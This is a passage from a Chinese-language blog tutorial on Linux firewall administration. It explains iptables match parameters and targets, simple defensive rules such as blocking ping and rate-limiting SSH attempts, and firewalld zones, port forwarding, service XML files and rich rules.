allowed disallowed；说明：修改某自定义规则链的名称。</span><br></pre></td></tr></table></figure></p><p>3）[match] 常用封包匹配参数<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">参数：-p, --protocol；范例：iptables -A INPUT -p tcp；说明：匹配通讯协议类型是否相符，可以使用 ! 运算符进行反向匹配，例如：-p !tcp，意思是指除 tcp 以外的其它类型，如udp、icmp等；如果要匹配所有类型，则可以使用 all 关键词，例如：-p all。</span><br><span class="line">参数：-s, --src, --source；范例：iptables -A INPUT -s 192.168.1.1；说明：用来匹配封包的来源 IP，可以匹配单机或网络，匹配网络时请用数字来表示 子网掩码，例如：-s 192.168.0.0/24，匹配 IP 时可以使用 ! 运算符进行反向匹配，例如：-s !192.168.0.0/24。</span><br><span class="line">参数：-d, --dst, --destination；范例：iptables -A INPUT -d 192.168.1.1；说明：用来匹配封包的目的地 IP，设定方式同上。</span><br><span class="line">参数：-i, --in-interface；范例：iptables -A INPUT -i eth0；说明：用来匹配封包是从哪块网卡进入，可以使用通配字符 + 来做大范围匹配，例如：-i eth+ 表示所有的 ethernet 网卡，也可以使用 ! 运算符进行反向匹配，例如：-i !eth0。</span><br><span class="line">参数：-o, --out-interface；范例：iptables -A FORWARD -o eth0；说明：用来匹配封包要从哪 块网卡送出，设定方式同上。</span><br><span class="line">参数：--sport, --source-port；范例：iptables -A INPUT -p tcp --sport 22；说明：用来匹配封包的源端口，可以匹配单一端口，或是一个范围，例如：--sport 22:80表示从 22 到 80 端口之间都算是符合条件，如果要匹配不连续的多个端口，则必须使用 --multiport 参数，详见后文。匹配端口号时，可以使用 ! 运算符进行反向匹配。</span><br><span class="line">参数：--dport, --destination-port；范例：iptables -A INPUT -p tcp --dport 22；说明：用来匹配封包的目的地端口号，设定方式同上</span><br><span class="line">参数：--tcp-flags；范例：iptables -p tcp --tcp-flags SYN,FIN,ACK SYN；说明：匹配 TCP 封包的状态标志，参数分为两个部分，第一个部分列举出想 匹配的标志，第二部分则列举前述标志中哪些有被设置，未被列举的标志必须是空的。TCP 状态标志包括：SYN（同步）、ACK（应答）、FIN（结束）、RST（重设）、URG（紧急） 、PSH（强迫推送） 等均可使用于参数中，除此之外还可以使用关键词 ALL 和 NONE 进行匹配。匹配标志时，可以使用 ! 运算符行反向匹配。</span><br><span class="line">参数：--syn；范例：iptables -p tcp --syn；说明：用来表示TCP通信协议中，SYN位被打开，而ACK与FIN位关闭的分组，即TCP的初始连接，与 iptables -p tcp --tcp-flags SYN,FIN,ACK SYN 的作用完全相同，如果使用 !运算符，可用来 匹配非要求连接封包。</span><br><span class="line">参数：-m multiport --source-port；范例：iptables -A INPUT -p tcp -m multiport --source-port 22,53,80,110；说明：用来匹配不连续的多个源端口，一次最多可以匹配 15 个端口，可以使用 ! 运算符进行反向匹配。</span><br><span class="line">参数：-m multiport --destination-port；范例：iptables -A INPUT -p tcp -m multiport --destination-port 22,53,80,110；说明：用来匹配不连续的多个目的地端口号，设定方式同上。</span><br><span class="line">参数：-m multiport --port；范例：iptables -A INPUT -p tcp -m multiport --port 22,53,80,110；说明：这个参数比较特殊，用来匹配源端口和目的端口号相同的封包，设定方式同上。注意：在本范例中，如果来源端口号为 80目的地端口号为 110，这种封包并不算符合条件。</span><br><span class="line">参数：--icmp-type；范例：iptables -A INPUT -p icmp --icmp-type 8；说明：用来匹配 ICMP 的类型编号，可以使用代码或数字编号来进行 匹配。请打 iptables -p icmp --help 来查看有哪些代码可用。</span><br><span class="line">参数：-m limit --limit；范例：iptables -A INPUT -m limit --limit 3/hour；说明：用来匹配某段时间内封包的平均流量，上面的例子是用来 匹配：每小时平均流量是否超过一次 3 个封包。 除了每小时平均次外，也可以每秒钟、每分钟或每天平均一次，默认值为每小时平均一次，参数如后： /second、 /minute、/day。 除了进行封 包数量的匹配外，设定这个参数也会在条件达成时，暂停封包的匹配动作，以避免因骇客使用洪水攻击法，导致服务被阻断。</span><br><span class="line">参数：--limit-burst；范例：iptables -A INPUT -m limit --limit-burst 5；说明：用来匹配瞬间大量封包的数量，上面的例子是用来匹配一次同时涌入的封包是否超过 5 个（这是默认值），超过此上限的封包将被直接丢弃。使用效果同上。</span><br><span class="line">参数：-m mac --mac-source；范例：iptables -A INPUT -m mac --mac-source 00:00:00:00:00:01；说明：用来匹配封包来源网络接口的硬件地址，这个参数不能用在 OUTPUT 和 POSTROUTING 规则链上，这是因为封包要送到网 卡后，才能由网卡驱动程序透过 ARP 通讯协议查出目的地的 MAC 地址，所以 iptables 在进行封包匹配时，并不知道封包会送到哪个网络接口去。</span><br><span class="line">参数：--mark；范例：iptables -t mangle -A INPUT -m mark --mark 1；说明：用来匹配封包是否被表示某个号码，当封包被匹配成功时，可以透过 MARK 处理动作，将该封包标示一个号码，号码最大不可以超过 4294967296。</span><br><span class="line">参数：-m owner --uid-owner；范例：iptables -A OUTPUT -m owner --uid-owner 500；说明：用来匹配来自本机的封包，是否为某特定使用者所产生的，这样可以避免服务器使用 root 或其它身分将敏感数据传送出，可以降低系统被骇的损失。可惜这个功能无法 匹配出来自其它主机的封包。</span><br><span class="line">参数：-m owner --gid-owner；范例：iptables -A OUTPUT -m owner --gid-owner 0；说明：用来匹配来自本机的封包，是否为某特定使用者群组所产生的，使用时机同上。</span><br><span class="line">参数：-m owner --pid-owner；范例：iptables -A OUTPUT -m owner --pid-owner 78；说明：用来匹配来自本机的封包，是否为某特定进程所产生的，使用时机同上。</span><br><span class="line">参数：m owner --sid-owner；范例：iptables -A OUTPUT -m owner --sid-owner 100；说明 用来匹配来自本机的封包，是否为某特定 连接（Session ID）的响应封包，使用时机同上。</span><br><span class="line">参数：-m state --state；范例：iptables -A INPUT -m state --state RELATED,ESTABLISHED；说明：用来匹配连接状态， 连接状态共有四种：INVALID、ESTABLISHED、NEW 和 RELATED。</span><br><span class="line">INVALID 表示该封包的连接编号（Session ID）无法辨识或编号不正确。</span><br><span class="line">ESTABLISHED 表示该封包属于某个已经建立的连接。</span><br><span class="line">NEW 表示该封包想要起始一个连接（重设连接或将连接重导向）。</span><br><span class="line">RELATED 表示该封包是属于某个已经建立的连接，所建立的新连接。例如：FTP-DATA 连接必定是源自某个 FTP 连接。</span><br></pre></td></tr></table></figure></p><p>4）[-j target/jump] 常用的处理动作：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">-j 参数用来指定要进行的处理动作，常用的处理动作包括：ACCEPT、REJECT、DROP、REDIRECT、MASQUERADE、LOG、DNAT、SNAT、MIRROR、QUEUE、RETURN、MARK，分别说明如下：</span><br><span class="line">ACCEPT： 将封包放行，进行完此处理动作后，将不再匹配其它规则，直接跳往下一个规则链（natostrouting）。</span><br><span class="line">REJECT： 拦阻该封包，并传送封包通知对方，可以传送的封包有几个选择：ICMP port-unreachable、ICMP echo-reply 或是tcp-reset（这个封包会要求对方关闭 连接），进行完此处理动作后，将不再匹配其它规则，直接中断过滤程序。 范例如下：iptables -A FORWARD -p TCP --dport 22 -j REJECT --reject-with tcp-reset</span><br><span class="line">DROP： 丢弃封包不予处理，进行完此处理动作后，将不再匹配其它规则，直接中断过滤程序。</span><br><span class="line">REDIRECT： 将封包重新导向到另一个端口（PNAT），进行完此处理动作后，将会继续匹配其它规则。 这个功能可以用来实现透明代理或用来保护 web 服务器。例如：iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-ports 8080</span><br><span class="line">MASQUERADE： 改写封包来源 IP 为防火墙 NIC IP，可以指定 port 对应的范围，进行完此处理动作后，直接跳往下一个规则 链（manglepostrouting）。这个功能与SNAT 略有不同，当进行 IP 伪装时，不需指定要伪装成哪个 IP，IP会从网卡直接读取，当使用拨 号接连时，IP通常是由ISP公司的DHCP 服务器指派的，这个时候 MASQUERADE 特别有用。范例如下：iptables -t nat -A POSTROUTING -p TCP -j MASQUERADE --to-ports 1024-31000</span><br><span class="line">LOG： 将封包相关讯息纪录在 /var/log 中，详细位置请查阅 /etc/syslog.conf 配置文件，进行完此处理动作后，将会继续匹配其规则。例如：iptables -A INPUT -p tcp -j LOG --log-prefix &quot;INPUT packets&quot;</span><br><span class="line">SNAT： 改写封包来源 IP 为某特定 IP 或 IP 范围，可以指定 port 对应的范围，进行完此处理动作后，将直接跳往下一个规则（mangleostrouting）。范例如下：iptables -t nat -A POSTROUTING -p tcp -o eth0 -j SNAT --to-source?194.236.50.155-194.236.50.160:1024-32000</span><br><span class="line">DNAT： 改写封包目的地 IP 为某特定 IP 或 IP 范围，可以指定 port 对应的范围，进行完此处理动作后，将会直接跳往下一个规则链（filter:input 或 filter:forward）。范例如下：iptables -t nat -A PREROUTING -p tcp -d 15.45.23.67 --dport 80 -j DNAT --to-destination 192.168.1.1-192.168.1.10:80-100</span><br><span class="line">MIRROR： 镜射封包，也就是将来源 IP 与目的地 IP 对调后，将封包送回，进行完此处理动作后，将会中断过滤程序。</span><br><span class="line">QUEUE： 中断过滤程序，将封包放入队列，交给其它程序处理。通过自行开发的处理程序，可以进行其它应用，例如：计算连接费用等。</span><br><span class="line">RETURN： 结束在目前规则链中的过滤程序，返回主规则链继续过滤，如果把自定义规则链看成是一个子程序，这个动作则就相当于提前结束子程序并返回到主程序中。</span><br><span class="line">MARK： 将封包标上某个代号，以便提供作为后续过滤的条件判断依据，进行完此处理动作后，将会继续匹配其它规则。范例如下：iptables -t mangle -A PREROUTING -p tcp --dport 22 -j MARK --set-mark 2</span><br></pre></td></tr></table></figure></p><h3 id="基本使用"><a href="#基本使用" class="headerlink" title="基本使用"></a>基本使用</h3><p>现在较新的linux版本基本都使用firewalld，因为它更加强大，这里不用它<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">yum -y install iptables-services #安装iptables</span><br><span class="line">systemctl enable iptables #开机启动</span><br><span class="line">systemctl start|stop|restart iptables #启动、停止、重启iptables</span><br></pre></td></tr></table></figure></p><p>1）查看系统中iptables中已经有的规则，知道如何关闭和启用这些规则<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ~]# iptables -L #查看现有防火墙所有策略</span><br></pre></td></tr></table></figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ~]# service iptables status #查看iptables状态</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2019/04/04/5ca572fc35954.png" alt="1.png"><br><strong>禁止ping</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ~]# iptables -A INPUT -p icmp -j DROP #在INPUT链中增加一条规则（丢弃ICMP包）</span><br></pre></td></tr></table></figure></p><p><img src="https://i.loli.net/2019/04/04/5ca576af89756.png" alt="2.png"><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ~]# iptables -A INPUT -p icmp -j REJECT #(返回一个终止数据包，拒绝连接动作)</span><br></pre></td></tr></table></figure></p><p><img src="https://i.loli.net/2019/04/04/5ca577a6c7cdf.png" alt="3.png"></p><blockquote><ul><li>REJECT是一种更符合规范的处理方式，并且在可控的网络环境中，更易于诊断和调试网络/防火墙所产生的问题；</li><li>DROP则提供了更高的防火墙安全性和稍许的效率提高，但是由于DROP不很规范(不很符合TCP连接规范)的处理方式，可能<br>会对你的网络造成一些不可预期或难以诊断的问题。</li></ul></blockquote><p><strong>防御DDos</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ~]# iptables -A INPUT -p tcp --dport 端口 -j DROP #短时间接收大量tcp数据包端口</span><br></pre></td></tr></table></figure></p><p>DDos仍然是很难防御的攻击<br><strong>防御SSH爆破</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ~]# iptables -A INPUT -p tcp --dport 22 -m state --state NEW -m recent --name SSH --update --seconds 60 --hitcount 3 -j DROP</span><br><span class="line">[root@localhost ~]# iptables -A INPUT -p tcp --dport 22 -m state --state NEW -m recent --name SSH --set -j ACCEPT</span><br></pre></td></tr></table></figure></p><p>对于ssh的新连接，将加入ssh列表中，一分钟超过3次错误连接，将拉入黑名单，并丢弃后续这个IP地址的请求包</p><h2 id="Firewalld构建动态防火墙"><a href="#Firewalld构建动态防火墙" class="headerlink" title="Firewalld构建动态防火墙"></a>Firewalld构建动态防火墙</h2><p>Firewalld 是新一 Linux 代防火墙工具，它提供了支持网络 / 防火墙区域 (zone) 定义网络链接以及接口安全等级的动态防火墙管理工具。它也支持允许服务或者应用程序直接添加防火墙规则的接口。<br><a href="https://blog.csdn.net/qq_36492368/article/details/80432259" target="_blank" rel="noopener">firewalld详解</a></p><h3 id="Firewalls两大特性"><a href="#Firewalls两大特性" class="headerlink" title="Firewalls两大特性"></a>Firewalls两大特性</h3><blockquote><ul><li>1）firewalld支持动态更新，不用重启服务，随时添加规则，随时生效，这个过程不需要重新装载netfilter内核模块，但是要求所有的规则都通过firewalld守护进程来实现，以确保守护进程内的防火墙状态和内核中的防火墙状态一致；守护进程firewalld，应用程序、守护进程和用户可以通过D-BUS请求一个防火墙特性，特性可以是预定义的防火墙功能，例如：服务、端口和协议的组合、端口/数据报转发、伪装、ICMP拦截或自定义的规则。原有的静态防火墙规则还可以继续使用，但是不能和firewalld同时存在，需要使用这两者中的任何一个时，停止另外一个的使用。</li><li>2)加入了区域（zone）的概念<br>区域定义了网络连接的可信等级，这是一个一对多的关系，意味着一次连接可以仅仅是一个区域的一部分，一个区域可以用于很多连接。</li></ul></blockquote><p><strong>firewalld 防火墙堆栈示意图:</strong><br><img src="https://i.loli.net/2019/04/04/5ca5949fc4ce4.png" alt="4.png"></p><h3 id="对网络区的理解"><a href="#对网络区的理解" class="headerlink" title="对网络区的理解:"></a>对网络区的理解:</h3><p>由firewalld 提供的区域按照从不信任到信任的顺序排序:</p><blockquote><ul><li>drop（丢弃）<br>任何接收的网络数据包都被丢弃，没有任何回复。仅能有发送出去的网络连接。</li><li>block（限制）<br>任何接收的网络连接都被 IPv4 的 icmp-host-prohibited 信息和 IPv6 的 icmp6-adm-prohibited 信息所拒绝。</li><li>public（公共）<br>在公共区域内使用，不能相信网络内的其他计算机不会对您的计算机造成危害，只能接收经过选取的连接。</li><li>external（外部）<br>特别是为路由器启用了伪装功能的外部网。您不能信任来自网络的其他计算，不能相信它们不会对您的计算机造成危害，只能接收经过选择的连接。</li><li>dmz（非军事区）<br>用于您的非军事区内的电脑，此区域内可公开访问，可以有限地进入您的内部网络，仅仅接收经过选择的连接。</li><li>work（工作）<br>用于工作区。您可以基本相信网络内的其他电脑不会危害您的电脑。仅仅接收经过选择的连接。</li><li>home（家庭）<br>用于家庭网络。您可以基本信任网络内的其他计算机不会危害您的计算机。仅仅接收经过选择的连接。</li><li>internal（内部）<br>用于内部网络。您可以基本上信任网络内的其他计算机不会威胁您的计算机。仅仅接受经过选择的连接。</li><li>trusted（信任）<br>可接受所有的网络连接。</li></ul></blockquote><p>安装时，firewalld 里的默认区域被设定为公共区域。<br><a href="https://access.redhat.com/documentation/zh-cn/red_hat_enterprise_linux/7/html/security_guide/sec-using_firewalls" target="_blank" rel="noopener">RHEL7安全性指南4.5. 使用防火墙</a><a href="https://blog.csdn.net/xiazichenxi/article/details/80169927" target="_blank" rel="noopener">firewalld简单使用</a></p><h3 id="基本命令"><a href="#基本命令" class="headerlink" title="基本命令"></a>基本命令</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ~]# systemctl start firewalld #启动Firewalls</span><br><span class="line">[root@localhost ~]# firewall-cmd --state #检查是否可以连接后台</span><br></pre></td></tr></table></figure><p><strong>区域相关设置</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ~]# firewall-cmd --get-zones #列出支持的区域列表</span><br><span class="line">[root@localhost ~]# firewall-cmd --get-active-zones #查看当前的区域</span><br><span class="line">[root@localhost ~]# firewall-cmd --set-default-zone=home  #将区域改为home</span><br><span class="line">[root@localhost ~]# firewall-cmd --get-zone-of-interface=ens33 查看接口区域</span><br><span class="line">[root@localhost ~]# firewall-cmd --zone=FedoraWorkstation --list-interfaces #查看FedoraWorkstation区域的接口</span><br><span class="line">[root@localhost ~]# firewall-cmd --zone=FedoraWorkstation --list-all #列出FedoraWorkstation区域的所有设置</span><br><span class="line">FedoraWorkstation (active)</span><br><span class="line">  target: default</span><br><span class="line">  icmp-block-inversion: no</span><br><span class="line">  interfaces: ens33</span><br><span class="line">  sources:</span><br><span class="line">  services: dhcpv6-client ssh samba-client mdns</span><br><span class="line">  ports: 1025-65535/udp 1025-65535/tcp</span><br><span class="line">  protocols:</span><br><span class="line">  masquerade: no</span><br><span class="line">  forward-ports:</span><br><span class="line">  source-ports:</span><br><span class="line">  icmp-blocks:</span><br><span class="line">  rich rules:</span><br></pre></td></tr></table></figure></p><p><strong>应急模式</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ~]# firewall-cmd --panic-on #阻止所有网络链接：</span><br><span class="line">[root@localhost ~]# firewall-cmd --panic-off #恢复链接：</span><br><span class="line">[root@localhost ~]# firewall-cmd --query-panic #查看是否启用应急模式</span><br></pre></td></tr></table></figure></p><p><strong>重载防火墙</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ~]# firewall-cmd --reload #重新加载防火墙,并不中断用户连接，即不丢失状态信息</span><br><span class="line">[root@localhost ~]# firewall-cmd --complete-reload #重新加载防火墙并中断用户连接，即丢弃状态信息(一般用于防火墙出现严重问题，如：重新加载防火墙并中断用户连接，即丢弃状态信息)</span><br></pre></td></tr></table></figure></p><p><strong>端口</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ~]# firewall-cmd --zone=FedoraWorkstation --list-ports #列出FedoraWorkstation区域所有开放的端口</span><br><span class="line">[root@localhost ~]# firewall-cmd --zone=home --add-port=444-555/tcp #将某个或者多个端口加入某区域</span><br></pre></td></tr></table></figure></p><p><strong>服务</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ~]# firewall-cmd --get-services #列出支持的服务</span><br><span class="line">[root@localhost ~]# firewall-cmd --zone=FedoraWorkstation --list-services #列出FedoraWorkstation区域启用的服务</span><br><span class="line">[root@localhost ~]# firewall-cmd --zone=home --add-service=smtp #将某服务加入某区域</span><br><span class="line">[root@localhost ~]# firewall-cmd --zone=home --remove-service=smtp #从区域移除服务</span><br></pre></td></tr></table></figure></p><p><strong>IP伪装</strong>：私有网络地址被隐藏并映射到一个公有IP，常用于路由<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ~]# firewall-cmd --zone=home --add-masquerade #允许伪装IP</span><br><span class="line">[root@localhost ~]# firewall-cmd --zone=zone --query-masquerade #检查区域是否启用ip伪装功能</span><br><span class="line">[root@localhost ~]# firewall-cmd --zone=zone --remove-masquerade #禁用伪装IP</span><br></pre></td></tr></table></figure></p><p><strong>ICMP阻塞</strong>：阻止一个或多个 ICMP 类型（这里阻塞ECHO Reply包）<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ~]# firewall-cmd --get-icmptypes #支持的ICMP类型</span><br><span class="line">[root@localhost ~]# firewall-cmd --zone=home --add-icmp-block=echo-reply #开启ICMP阻塞</span><br><span class="line">[root@localhost ~]# firewall-cmd --zone=home -- --remove-icmp-block==echo-reply #禁用ICMP阻塞</span><br><span class="line">[root@localhost ~]# firewall-cmd --zone=home ---query-icmp-block==echo-reply #查看ICMP阻塞状态</span><br></pre></td></tr></table></figure></p><p><img src="https://i.loli.net/2019/04/07/5ca9d3a835829.png" alt="5.png"><br>注：ping包ECHO REQUEST和ECHO REPLY<br><strong>端口转发</strong><br>端口转发需要先开启IP伪装<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ~]# firewall-cmd --zone=home --add-forward-port=port=80:proto=tcp:toport =8080 #将本机80端口转发至8080端口</span><br><span class="line">[root@localhost ~]# firewall-cmd --zone=home --add-forward-port=port=80:proto=tcp:toaddr=192.168.67.130 #将本机映射到另外一个地址上的相同端口</span><br><span class="line">[root@localhost ~]# firewall-cmd --zone=home --add-forward-port=port=80:proto=tcp:toport=8080:toaddr=192.168.67.130 #将本机映射到另外一个地址上的不同端口</span><br><span class="line">[root@localhost ~]# firewall-cmd --zone=home --remove-forward-port=port=80:proto=tcp:toport =8080 #删除本机80端口转发至8080端口</span><br><span class="line">[root@localhost ~]# firewall-cmd --zone=home --remove-forward-port=port=80:proto=tcp:toremover=192.168.67.130 #删除本机映射到另外一个地址上的相同端口</span><br><span class="line">[root@localhost ~]# firewall-cmd --zone=home --remove-forward-port=port=80:proto=tcp:toport=8080:toremover=192.168.67.130 #删除本机映射到另外一个地址上的不同端口</span><br><span class="line">[root@localhost ~]# firewall-cmd --zone=home --query-forward-port=port=80:proto=tcp:topo rt=8080 #查看某区域内的端口转发</span><br></pre></td></tr></table></figure></p><p><strong>设置永久保留</strong><br>上述是临时的配置，重载后配置将不再保留，如果需要将设置永久保留，则需要使用–permanent 选项。只有在增加 –permanent 选项并重新加载防火墙，永久选项才会生效<br>如：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ~]# firewall-cmd --permanent --zone=home --add-port=80/tcp</span><br></pre></td></tr></table></figure></p><h3 id="高级设置"><a href="#高级设置" class="headerlink" title="高级设置"></a>高级设置</h3><p>1、<strong>使用XML文件配置防火墙</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ~]# cat /usr/lib/firewalld/services/smtp.xml</span><br><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;service&gt;</span><br><span class="line">  &lt;short&gt;Mail (SMTP)&lt;/short&gt;</span><br><span class="line">  &lt;description&gt;This option allows incoming SMTP mail delivery. If you need to allow remote hosts to connect directly to your machine to deliver mail, enable this option. You do not need to enable this if you collect your mail from your ISP&apos;s server by POP3 or IMAP, or if you use a tool such as fetchmail. Note that an improperly configured SMTP server can allow remote machines to use your server to send spam.&lt;/description&gt;</span><br><span class="line">  &lt;port protocol=&quot;tcp&quot; port=&quot;25&quot;/&gt;</span><br><span class="line">&lt;/service&gt;</span><br></pre></td></tr></table></figure></p><p>能看出每一个服务定义都需要一个简短的名字、描述和端口网络用于指定需要使用的协议、端口和模块名<br>使用此结构，自定义服务配置<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ~]# vim /usr/lib/firewalld/services/test.xml</span><br><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;service&gt;</span><br><span class="line">        &lt;short&gt;TEST&lt;/short&gt;</span><br><span class="line">        &lt;description&gt;This is Test&lt;/description&gt;</span><br><span class="line">        &lt;port port=&quot;4444&quot; protocol=&quot;tcp&quot;/&gt;</span><br><span class="line">&lt;/service&gt;</span><br></pre></td></tr></table></figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ~]# firewall-cmd --reload </span><br><span class="line">[root@localhost ~]# firewall-cmd --get-services</span><br></pre></td></tr></table></figure><p>接下来就可以将服务加入区域之类的<br><img src="https://i.loli.net/2019/04/08/5caabeb25b5e0.png" alt="6.png"><br><a href="https://twoerner.fedorapeople.org/firewalld/doc/firewalld.icmptype.html" target="_blank" rel="noopener">firewalld.icmptype(5)</a> 操作手册 — 描述了 ICMP 过滤的 XML 配置文件。<br><a href="https://twoerner.fedorapeople.org/firewalld/doc/firewalld.service.html" target="_blank" rel="noopener">firewalld.service(5)</a> 操作手册 — 描述了 firewalld service 的 XML 配置文件。<br><a href="https://twoerner.fedorapeople.org/firewalld/doc/firewalld.zones.html" target="_blank" rel="noopener">firewalld.zone(5)</a> 操作手册 — 描述了配置 firewalld 区域的 XML 配置文件。</p><p>2、<strong>firewall-cmd –direct(firewalld直接接口) </strong><br>使用–direct在运行时间里增加或者移除链，命令立刻生效，但重载后失效。传递的参数 <args> 与 iptables, ip6tables 以及 ebtables 一致<br><a href="https://twoerner.fedorapeople.org/firewalld/doc/firewall-cmd.html" target="_blank" rel="noopener">firewall-cmd操作</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ~]# firewall-cmd --direct --get-rules ipv4 filter INPUT #列出INPUT链中的规则</span><br></pre></td></tr></table></figure></args></p><p>3、<strong>使用Rich Language配置复杂防火墙规则</strong><br>可以用比直接接口方式更易理解的方法建立复杂防火墙规则，<a href="https://fedoraproject.org/wiki/Features/FirewalldRichLanguage/zh-cn" target="_blank" rel="noopener">Firewalld Rich Language 文档</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ~]# firewall-cmd --help | grep &quot;rule&quot;</span><br><span class="line">  --list-rich-rules    List rich language rules added for a zone [P] [Z]</span><br><span class="line">  --add-rich-rule=&lt;rule&gt;</span><br><span class="line">                       Add rich language rule &apos;rule&apos; for a zone [P] [Z] [T]</span><br><span class="line">  --remove-rich-rule=&lt;rule&gt;</span><br><span class="line">                       Remove rich language rule &apos;rule&apos; from a zone [P] [Z]</span><br><span class="line">  --query-rich-rule=&lt;rule&gt;</span><br><span class="line">                       Return whether a rich language rule &apos;rule&apos; has been</span><br><span class="line">  --get-all-rules</span><br><span class="line">                       Get all rules [P]</span><br><span class="line">  --get-rules &#123;ipv4|ipv6|eb&#125; &lt;table&gt; &lt;chain&gt;</span><br><span class="line">                       Get all rules added to chain in table [P]</span><br><span class="line">  --add-rule &#123;ipv4|ipv6|eb&#125; &lt;table&gt; &lt;chain&gt; &lt;priority&gt; &lt;arg&gt;...</span><br><span class="line">                       Add rule to chain in table [P]</span><br><span class="line">  --remove-rule &#123;ipv4|ipv6|eb&#125; &lt;table&gt; &lt;chain&gt; &lt;priority&gt; &lt;arg&gt;...</span><br><span class="line">                       Remove rule with priority from chain in table [P]</span><br><span class="line">  --remove-rules &#123;ipv4|ipv6|eb&#125; &lt;table&gt; &lt;chain&gt;</span><br><span class="line">                       Remove rules from chain in table 